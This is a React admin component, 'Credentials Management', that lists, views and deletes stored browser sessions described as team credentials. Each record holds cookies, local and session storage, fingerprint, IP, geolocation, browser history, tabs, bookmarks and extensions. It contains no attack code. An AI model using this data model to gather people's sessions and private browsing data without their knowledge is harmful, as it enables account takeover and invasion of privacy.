'use client'

import { useState, useEffect } from 'react'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Eye, Trash2, RefreshCw, Download } from 'lucide-react'

interface Credential {
  id: string
  createdAt: string
  credentialSource: string
  lastUsedAt?: string
  ipAddress?: string
  userAgent?: string
  platform?: string
  browser?: string
  cookies: Record<string, any>
  localStorage: Record<string, any>
  sessionStorage: Record<string, any>
  fingerprint?: Record<string, any>
  geoLocation?: any
  metadata?: Record<string, any>
  browserHistory?: any
  tabs?: any
  bookmarks?: any
  downloads?: any
  extensions?: any
  isActive: boolean
}

export default function CredentialsManagement() {
  const [credentials, setCredentials] = useState<Credential[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [actionLoading, setActionLoading] = useState<string | null>(null)
  const [selectedCredentials, setSelectedCredentials] = useState<string[]>([])

  const loadCredentials = async () => {
    try {
      setIsLoading(true)
      setError(null)
      
      const token = localStorage.getItem('choco_token')
      if (!token) {
        setError('No authentication token found')
        return
      }

      const response = await fetch('/api/credentials/get', {
        headers: { 'Authorization': `Bearer ${token}` }
      })

      if (!response.ok) {
        throw new Error('Failed to fetch credentials')
      }

      const data = await response.json()
      if (data.success) {
        setCredentials(data.data?.credentials || [])
      } else {
        setError(data.error || 'Failed to load credentials')
      }
    } catch (error) {
      console.error('Failed to load credentials:', error)
      setError('Failed to load credentials')
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (credentialId: string) => {
    if (!confirm('Are you sure you want to delete this credential?')) {
      return
    }

    try {
      setActionLoading(credentialId)
      
      const token = localStorage.getItem('choco_token')
      if (!token) {
        alert('No authentication token found')
        return
      }

      const response = await fetch(`/api/credentials/cleanup?credentialId=${credentialId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })

      const result = await response.json()
      if (result.success) {
        setCredentials(prev => prev.filter(c => c.id !== credentialId))
        alert('Credential deleted successfully')
      } else {
        alert(result.message || 'Failed to delete credential')
      }
    } catch (error) {
      console.error('Failed to delete credential:', error)
      alert('Failed to delete credential')
    } finally {
      setActionLoading(null)
    }
  }

  const handleView = (credential: Credential) => {
    alert(`Credential Details:\nID: ${credential.id}\nBrowser: ${credential.browser}\nPlatform: ${credential.platform}\nCookies: ${Object.keys(credential.cookies || {}).length}\nCreated: ${new Date(credential.createdAt).toLocaleDateString()}`)
  }

  const handleRefresh = () => {
    loadCredentials()
  }

  useEffect(() => {
    loadCredentials()
  }, [])

  const handleSelectAll = () => {
    if (selectedCredentials.length === credentials.length) {
      setSelectedCredentials([])
    } else {
      setSelectedCredentials(credentials.map(c => c.id))
    }
  }

  const handleSelectCredential = (credentialId: string) => {
    setSelectedCredentials(prev => 
      prev.includes(credentialId) 
        ? prev.filter(id => id !== credentialId)
        : [...prev, credentialId]
    )
  }

  const handleBulkDelete = () => {
    selectedCredentials.forEach(id => handleDelete(id))
    setSelectedCredentials([])
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    })
  }

  const getCookieCount = (cookies: Record<string, any>) => {
    return Object.keys(cookies || {}).length
  }

  const getStorageCount = (storage: Record<string, any>) => {
    return Object.keys(storage || {}).length
  }

  const truncateText = (text: string, maxLength: number = 30) => {
    return text.length > maxLength ? `${text.substring(0, maxLength)}...` : text
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold text-slate-900">Credentials Management</h2>
          <p className="text-slate-600">Manage team credentials and browser data</p>
        </div>
        <div className="flex items-center space-x-3">
          {selectedCredentials.length > 0 && (
            <Button
              variant="destructive"
              size="sm"
              onClick={handleBulkDelete}
              className="flex items-center space-x-2"
            >
              <Trash2 className="w-4 h-4" />
              <span>Delete Selected ({selectedCredentials.length})</span>
            </Button>
          )}
          <Button
            variant="outline"
            size="sm"
            onClick={handleRefresh}
            className="flex items-center space-x-2"
          >
            <RefreshCw className="w-4 h-4" />
            <span>Refresh</span>
          </Button>
        </div>
      </div>

      {/* Credentials Table */}
      <div className="bg-white rounded-lg shadow-sm border overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-slate-50 border-b">
              <tr>
                <th className="px-4 py-3 text-left">
                  <input
                    type="checkbox"
                    checked={selectedCredentials.length === credentials.length && credentials.length > 0}
                    onChange={handleSelectAll}
                    className="rounded border-slate-300"
                  />
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  ID & Status
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Browser Info
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Data Summary
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Created
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Last Used
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">
                  Actions
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-slate-200">
              {credentials.map((credential) => (
                <tr key={credential.id} className="hover:bg-slate-50">
                  <td className="px-4 py-4">
                    <input
                      type="checkbox"
                      checked={selectedCredentials.includes(credential.id)}
                      onChange={() => handleSelectCredential(credential.id)}
                      className="rounded border-slate-300"
                    />
                  </td>
                  
                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="text-sm font-mono text-slate-600">
                        {credential.id.substring(0, 8)}...
                      </div>
                      <div className="flex items-center space-x-2">
                        <Badge 
                          className={credential.isActive 
                            ? "bg-green-100 text-green-700" 
                            : "bg-gray-100 text-gray-700"
                          }
                        >
                          {credential.isActive ? 'Active' : 'Inactive'}
                        </Badge>
                        <Badge variant="outline" className="text-xs">
                          {credential.credentialSource}
                        </Badge>
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="text-sm font-medium text-slate-900">
                        {credential.browser || 'Unknown'}
                      </div>
                      <div className="text-xs text-slate-500">
                        {credential.platform || 'Unknown Platform'}
                      </div>
                      <div className="text-xs text-slate-400">
                        {credential.ipAddress || 'No IP'}
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="space-y-1">
                      <div className="flex items-center space-x-3 text-xs">
                        <span className="text-slate-600">
                          🍪 {getCookieCount(credential.cookies)}
                        </span>
                        <span className="text-slate-600">
                          💾 {getStorageCount(credential.localStorage)}
                        </span>
                        <span className="text-slate-600">
                          📱 {getStorageCount(credential.sessionStorage)}
                        </span>
                      </div>
                      <div className="flex items-center space-x-2">
                        {credential.fingerprint && (
                          <Badge variant="outline" className="text-xs">Fingerprint</Badge>
                        )}
                        {credential.geoLocation && (
                          <Badge variant="outline" className="text-xs">Location</Badge>
                        )}
                        {credential.browserHistory && (
                          <Badge variant="outline" className="text-xs">History</Badge>
                        )}
                      </div>
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="text-sm text-slate-900">
                      {formatDate(credential.createdAt)}
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="text-sm text-slate-900">
                      {credential.lastUsedAt 
                        ? formatDate(credential.lastUsedAt)
                        : 'Never'
                      }
                    </div>
                  </td>

                  <td className="px-4 py-4">
                    <div className="flex items-center space-x-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleView(credential)}
                        className="flex items-center space-x-1"
                      >
                        <Eye className="w-3 h-3" />
                        <span>View</span>
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleDelete(credential.id)}
                        className="flex items-center space-x-1 text-red-600 hover:text-red-700"
                      >
                        <Trash2 className="w-3 h-3" />
                        <span>Delete</span>
                      </Button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {credentials.length === 0 && (
          <div className="text-center py-12">
            <div className="text-slate-400 text-lg mb-2">No credentials found</div>
            <div className="text-slate-500 text-sm">
              Team members haven't set up any credentials yet
            </div>
          </div>
        )}
      </div>

      {/* Summary Footer */}
      {credentials.length > 0 && (
        <div className="bg-slate-50 rounded-lg p-4">
          <div className="flex items-center justify-between text-sm text-slate-600">
            <span>Total: {credentials.length} credentials</span>
            <span>Active: {credentials.filter(c => c.isActive).length}</span>
            <span>Selected: {selectedCredentials.length}</span>
          </div>
        </div>
      )}
    </div>
  )
}
